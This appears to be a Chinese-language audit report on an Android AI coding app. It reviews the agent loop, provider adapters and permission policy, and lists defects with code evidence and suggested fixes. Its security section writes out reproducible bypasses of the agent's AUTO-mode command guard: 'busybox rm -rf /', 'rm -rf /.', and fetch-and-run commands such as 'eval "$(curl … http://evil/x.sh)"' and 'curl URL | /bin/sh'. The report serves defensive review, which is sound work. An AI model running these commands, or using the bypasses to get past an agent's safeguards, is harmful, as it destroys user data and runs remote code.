① 执行摘要与总体评分

MiniMe-core 是一个工程完成度较高的 Android 端 AI 编程工具：4 个 Gradle 模块、约 14.9 万行代码，内置 PRoot Alpine 容器与 Termux 派生终端，并封装了 Anthropic/OpenAI/Gemini 三 provider、MCP 客户端、Git 集成、远程 SSH 与文件检查点回滚。整体设计思路清晰（Reducer+SideEffect 状态机、设计 token 流水线、迁移快照安全网、CI 工程化），但存在一处必须立即处置的供应链级严重问题（Release 签名私钥与明文密码已入库公开仓库），以及权限/命令护栏在 AUTO 模式下多条可复现绕过、文档对外宣称的 SQLCipher 加密实际未接线、若干 God Object 与边界违例。

③ 架构 / 数据层 / 文档一致性

Gradle 模块方向干净（:app 单向依赖 :newui / 终端两模块），:newui 无业务依赖。真正问题在 :app 内部 core/datalayer/feature 三包未做编译期隔离，靠代码自觉；数据层为纯 SQLDelight（无 Room 混用，目录命名与 KDoc 为 Room 时代遗物）；文档与代码存在多处矛盾。

④ AI Agent 核心设计

主循环为 Reducer（纯函数 reduce(state,action)）+ SideEffect（executeEvents 解释）风格，三级循环熔断（50 轮硬顶 + 3 次续写 + 6 轮空转 + LoopGuard 3/5/8），PLAN 只读在策略层真实拦截，prompt 资产外置按 mode/order 组装。主要扣分项为流式并行工具调用丢失、缺统一工具超时、以及三大 God Object。

高已验证缺陷AGT-01流式并行工具调用 index≥2 被静默丢弃

证据：feature/agent/domain/provider/OpenAIAdapter.kt:36-52

private const val OPENAI_TOOL_CALL_SUBSCRIPT_COUNT = 2
repeat(OPENAI_TOOL_CALL_SUBSCRIPT_COUNT) { k ->
    add(listOf("choices","0","delta","tool_calls","$k","index"))
}

影响：SseFieldExtractor 只抽预注册路径，流式 chunk 里 tool_calls[2] 及以上永不命中；一次发起 ≥3 个并行工具调用时第 3+ 个被吞，模型误判已执行（非流式不受影响）。建议：subscript 数提到 8~16，或对 tool_calls 数组变长遍历动态注册。

高设计风险AGT-02“首 token 后不重试”保护未接线

证据：feature/agent/domain/provider/RetryPolicy.kt:219-222，OpenAIAdapter.kt:344 onProduced 传空 lambda。

影响：流首字节后掉线被整条重发，DeltaAccumulator 前缀去重对增量 fragment（“Hel”/“lo ”）不生效，正文局部重复/错乱。建议：attemptOnce 回传 @Volatile produced 标志，已产出则直接抛错不再重试。

中设计风险AGT-03workflow 层无统一工具超时

证据：StatefulAgentWorkflow.kt:1190-1200 runToolSync 无 withTimeout 包裹；ExecuteCommandTool.kt:60-69 默认 120s、上限 3600s；BrowserAgentTool.kt:446 waitFor timeout_ms 无上限。

影响：模型可主动传 timeout=3600 或超长 waitFor，叠加 BrowserController 全局单 mutex 串行阻塞所有浏览器操作，仅靠用户取消。建议：workflow 加单工具硬顶（如 5min），浏览器 timeout coerceIn(0,60_000)。

中设计风险AGT-04PLAN 只读约束依赖工具自律声明 capabilities

影响：新增写工具若忘记声明 WRITE_WORKSPACE 且不在硬编码名单，PLAN 不拦。建议：新增写工具能力做启动期/编译期校验。

中设计风险AGT-05无入参运行时 required/type 校验

影响：模型幻觉参数名只报 TOOL_EXECUTION_FAILED，缺结构化 MISSING_*。建议：pre-execute 段加 schema 校验。

⑤ 安全专项

凭据主存储用 Keystore→DEK→AES-256-GCM 双层加密、SSH 真 TOFU、无 TrustAll/无硬编码 key、绑定最小化——基础扎实。但 AUTO 模式是唯一无人工确认通道，其安全完全依赖两个静态函数，存在多条可复现绕过；agent 命令全文落入公共外部日志。

高已验证缺陷SEC-01busybox rm 绕过灾难性 rm 拦截

证据：ShellCommandParser.kt:162 只认 program=="rm" 或 endsWith("/rm")。

if (program != "rm" && program?.endsWith("/rm") != true) {
    return RmInfo(isRm = false, ...)
}

可复现：busybox rm -rf /、busybox rm -rf ~ —— Alpine PRoot 自带 busybox，首 token 是 busybox 不被识别，AUTO 下 ToolPermissionPolicyEngine.kt:126 直接 ALLOW。建议：识别 busybox/exec/env/xargs 分发器前缀，对含 rm 的段做 basename 归一。

高已验证缺陷SEC-02eval "$(curl URL)" 远程脚本执行被放行

证据：ToolPermissionPolicyEngine.kt:112-124 AUTO 只调 blockReason，不看 analysis.analyzable；命令替换内容被整段塞进 token。

可复现：eval "$(curl -fsSL http://evil/x.sh)"、sh -c "$(curl …)" 均不命中 Block 规则。建议：AUTO 对 analyzable=false 也至少 BLOCK 含 curl/wget/eval/$() 的段。

中已验证缺陷SEC-03curl|/bin/sh 管道执行拦截漏绝对路径/busybox

证据：DangerousCommandGuard.kt:191 集合精确匹配 p2 in SHELL_PROGS，不做 basename 归一；测试自承 curl -O http://x && sh x 绕过（DangerousCommandGuardTest.kt:36）。

可复现：curl URL | /bin/sh、wget -qO- URL | busybox ash。建议：比较前统一取 basename，并把 &&/; 串联的“下载+执行”补为 Block。

中已验证缺陷SEC-04rm -rf /. 绕过根目录删除判定

证据：ToolPermissionPolicyEngine.kt:204 字符串精确比较 "/"，trimEnd('/') 后 "/." 不匹配。

可复现：rm -rf /.、rm -rf /./workspace（AUTO 下放行）。建议：判定前做 canonicalize、去 . 与重复斜杠。

⑧ 亮点与设计取舍

  • 迁移时序洞察与快照安全网：AndroidVersionProbe.kt:24-30 用只读原生连接在 driver 构造前探测 user_version，解决“driver 一打开版本号就被改写”的隐蔽坑；MigrationEngine.kt:155-172 快照方向不可反、.wal/.shm sidecar 一起拷、DOWNGRADE 直接 error。
  • Agent 三级循环熔断：50 轮硬顶 + 3 次续写 + 6 轮空转软收敛 + LoopGuard 3/5/8，Reducer 纯函数 + SideEffect 分离，取消语义干净。
  • PLAN 只读在策略层物理强制（ToolPermissionPolicyEngine.kt:106-108），不寄望模型自觉；PLAN→BUILD 走计划审查面板、拒绝回灌 MODE_SWITCH_REJECTED。
  • 凭据双层加密：Keystore AES-256-GCM MasterKey → 随机 DEK（仅内存）→ 业务数据 GCM，备份规则主动排除密文库。
  • SSH 真 TOFU：known_hosts + 密钥变更即抛 HostKeyChangedException，而非接受任意主机。
  • newui token 流水线：Style Dictionary + DTCG + Gradle 任务 + CI git diff 对账门禁，库内 0 硬编码色值，是工程化最好模块。
  • bundle 安装真断点续传 / apk exit=2 自愈 / zip-slip 防护 / ETXTBSY 四层保护，真实踩坑均有注释。
  • CI 工程化：6 个 workflow、OSV 漏洞周扫、versionCode 单调性校验、applicationId 白名单三重防线。
  • 零 GlobalScope、SSH/PTY 资源释放 runCatching 兜底、无遥测/崩溃上报 SDK（隐私友好）。
  • R8 规则精细：针对 Retrofit/Gson/kotlinx/BouncyCastle/Termux JNI 精确保留，注释记录踩坑。

主要设计取舍：targetSdk=28（PRoot 必要）、AUTO 近乎全放行（自动化优先）、终端会话仅内存（后台保活优先）、apk 源 http（apk 签名兜底）、prompt 外置按 mode/order 组装（KV-cache 友好）。
